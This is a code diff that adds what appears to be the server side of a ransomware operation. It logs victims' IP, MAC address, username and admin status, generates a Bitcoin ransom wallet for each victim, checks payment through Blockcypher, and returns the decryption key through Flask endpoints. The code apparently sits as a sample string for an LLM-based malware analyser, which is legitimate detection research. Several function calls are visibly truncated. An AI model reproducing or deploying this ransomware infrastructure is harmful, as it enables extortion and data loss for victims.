+    payment_details = """CREATE TABLE IF NOT EXISTS `payment_details` (`client_id` VARCHAR(100) NOT NULL,`payee_address` VARCHAR(1000) NOT NULL,`is_decrypted` BOOLEAN NOT NULL, `created_time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`client_id`));"""
+    cursor.execute(payment_details)
+    connection.commit()
+    connection.close()
+def insert_statistics_to_database(statistics):
+    try:
+        logger.info("Inserting statistics into database")
+        connection = create_connection()
+        cursor = connection.cursor()
+        statistics_insert_query = "INSERT INTO `statistics` (client_id, platform, architecture, ip_address, mac_address, device_name, username, is_admin) VALUES (:client_id, :platform, :architecture, :ip_address, :mac_address, :device_name, :username, :is_admin);"
+        cursor.execute(statistics_insert_query, statistics)
+        connection.commit()
+        connection.close()
+    except sqlite3.IntegrityError as err:
+        logger.error(f"{err}: Client ID already present")
+def insert_bitcoin_details_to_database(
+    client_id, wallet_address, wif_encoded_private_key, public_key
+    connection = create_connection()
+    cursor = connection.cursor()
+    bitcoin_details_insert_query = "INSERT INTO `bitcoin_details` (client_id, wallet_address, public_key, wif_private_key) VALUES (?, ?, ?, ?);"
+    cursor.execute(
+        [client_id, wallet_address, public_key, wif_encoded_private_key],
+    )
+    connection.commit()
+    connection.close()
+def get_bitcoin_wallet_id_database(client_id):
+    connection = create_connection()
+    cursor = connection.cursor()
+    wallet_query = "SELECT wallet_address FROM `bitcoin_details` where client_id = ?;"
+    result = cursor.execute(wallet_query, [client_id])
+    id = result.fetchone()
+    connection.close()
+    if id is not None:
+        return id[0]
+def insert_payment_details_into_database(client_id, payee_wallet_address):
+    connection = create_connection()
+    cursor = connection.cursor()
+    payment_details_insert_query = "INSERT INTO `payment_details`(client_id, payee_address, is_decrypted) VALUES (?, ?, ?)"
+    cursor.execute(
+        payment_details_insert_query, [client_id, payee_wallet_address, True]
+    )
+    connection.commit()
+    connection.close()
+import hashlib
+import logging
+import blockcypher
+from asymmetric_encryption import ECC
+from db import (
+    insert_bitcoin_details_to_database,
+    get_bitcoin_wallet_id_database,
+    insert_payment_details_into_database,
+)
+def sha256(data):
+    sha256 = hashlib.sha256()
+    sha256.update(data)
+    return sha256.hexdigest()
+def ripemd160(data):
+    ripemd160 = hashlib.new("ripemd160")
+    ripemd160.update(data)
+    return ripemd160.hexdigest()
+def b58encode(data):
+    alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
+    b58_string = ""
+    leading_zeros = len(data) - len(data.lstrip("0"))
+    address_int = int(data, 16)
+    while address_int > 0:
+        digit = address_int % 58
+        digit_char = alphabet[digit]
+        b58_string = digit_char + b58_string
+        address_int //= 58
+    ones = leading_zeros // 2
+    for _ in range(ones):
+        b58_string = "1" + b58_string
+    return b58_string
+def generate_bitcoin_wallet_address(public_key):
+    hashed_public_key_hex = ripemd160(bytes.fromhex(sha256(public_key)))
+    key_with_network_byte = f"00{hashed_public_key_hex}"
+    checksum = sha256(bytes.fromhex(sha256(bytes.fromhex(key_with_network_byte))))
+    address_in_hex_format = f"{key_with_network_byte}{checksum[:8]}"
+    wallet_address = b58encode(address_in_hex_format)
+    return wallet_address
+def encode_private_key_in_wif(private_key):
+    private_key_in_hex = private_key.hex()
+    network_byte = "80"
+    first_four_bytes_of_checksum = sha256(
+        bytes.fromhex(sha256(bytes.fromhex(f"{network_byte}{private_key_in_hex}")))
+    )[0:8]
+    key_in_hex = f"{network_byte}{private_key_in_hex}{first_four_bytes_of_checksum}"
+    key_in_wif = b58encode(key_in_hex)
+    return key_in_wif
+def generate_bitcoin_address(client_id):
+    logger.info(f"Generating bitcoin payment addresses for {client_id}")
+    cipher = ECC()
+    serialized_private_key = cipher.private_key
+    serialized_public_key = cipher.public_key
+    wallet_address = get_bitcoin_wallet_id_database(client_id)
+    if wallet_address:
+        return wallet_address
+    wallet_address = generate_bitcoin_wallet_address(serialized_public_key)
+    wif_encoded_private_key = encode_private_key_in_wif(serialized_private_key)
+    insert_bitcoin_details_to_database(
+        serialized_public_key.decode(),
+    )
+    logger.info(f"Successfully inserted bitcoin details for {client_id}")
+    return wallet_address
+def verify_payment(client_id, assigned_wallet_address, payee_wallet_address):
+    if not assigned_wallet_address == get_bitcoin_wallet_id_database(client_id):
+        logger.error("Given wallet address does not match with assigned wallet address")
+        return None
+    address_details = blockcypher.get_address_overview(assigned_wallet_address)
+    if address_details.get("balance") > 5328:
+        insert_payment_details_into_database(client_id, payee_wallet_address)
+        return True
+    return True  # For testing
+import logging
+import random
+from flask import Flask, request, json, Response
+from werkzeug import exceptions
+from utils import process_request
+from db import create_tables
+def initialise():
+    return process_request(request, "initialise")
+def decrypt():
+    return process_request(request, "decrypt")
+import logging
+import requests
+import ipaddress
+import random
+from asymmetric_encryption import RSA
+from base64 import b64encode, b64decode
+from payment import verify_payment, generate_bitcoin_address
+from db import insert_statistics_to_database
+from validation import validate_decryption_request, validate_initialisation_request
+def decrypt_rsa_data(encrypted_key):
+    logger.info("Decrypting RSA data")
+    cipher = RSA()
+    unencrypted_local_private_key = b"".join(
+        [cipher.decrypt_data(key_part) for key_part in encrypted_key]
+    )
+    payload = {"key": b64encode(unencrypted_local_private_key).decode("ascii")}
+    logger.info(f"Returning Payload: {payload}")
+    return payload
+def unpack_decrypt_request(request_parameters):
+    client_id = request_parameters.get("client_id")
+    private_key = [b64decode(part) for part in request_parameters.get("private_key")]
+    assigned_wallet_address = b64decode(
+        request_parameters.get("assigned_wallet_address")
+    ).decode()
+    payee_wallet_address = b64decode(
+        request_parameters.get("payee_wallet_address")
+    ).decode()
+    return client_id, private_key, assigned_wallet_address, payee_wallet_address
+def unpack_initialise_request(request_parameters):
+    client_id = request_parameters.get("client_id")
+    statistics = request_parameters.get("statistics")
+    return client_id, statistics
+def format_and_insert_statistics_to_database(client_id, statistics, request):
+    statistics["client_id"] = client_id
+    if request.headers.getlist("X-Forwarded-For"):
+        ip = ipaddress.ip_address(request.headers.getlist("X-Forwarded-For")[0])
+    else:
+        ip = ipaddress.ip_address(request.remote_addr)
+    statistics["ip_address"] = str(ip)
+    insert_statistics_to_database(statistics)
+def process_request(request, request_type):
+    parameters = request.get_json()
+    if request_type == "initialise" and validate_initialisation_request(parameters):
+        client_id, statistics = unpack_initialise_request(parameters)
+        wallet_id = generate_bitcoin_address(client_id)
+        format_and_insert_statistics_to_database(client_id, statistics, request)
+        return {"client_id": client_id, "wallet_id": wallet_id}
+    elif request_type == "decrypt" and validate_decryption_request(parameters):
+        client_id, private_key, assigned_wallet_address, payee_wallet_address = unpack_decrypt_request(parameters)
+        if verify_payment(client_id, assigned_wallet_address, payee_wallet_address):
+            return decrypt_rsa_data(private_key)
+import logging
+from cerberus import Validator
+from werkzeug.exceptions import BadRequest
+initialisation_parameters = {
+}
+decryption_parameters = {
+}
+def validate_decryption_request(parameters):
+    logger.info("Validating decrypt parameters")
+    decryption_validator = Validator(decryption_parameters)
+    result = decryption_validator.validate(parameters)
+    if result:
+        return True
+    logger.error("Validation Failed: {0}".format(decryption_validator.errors))
+    raise BadRequest
+def validate_initialisation_request(parameters):
+    logger.info("Validating initialisation parameters")
+    initialisation_validator = Validator(initialisation_parameters)
+    result = initialisation_validator.validate(parameters)
+    if result:
+        return True
+    logger.error("Validation Failed: {0}".format(initialisation_validator.errors))
+    raise BadRequest
+
 
 '''
 
@@ -573,5 +532,4 @@ thread2.join()
         base_url="https://ark.cn-beijing.volces.com/api/v3"
     )
     sensitive_api_result = llm_evaluate.malware_analyze_two_steps(code_snippet)
-    print("LLM Malicious Assertion Result:")
     print(sensitive_api_result)
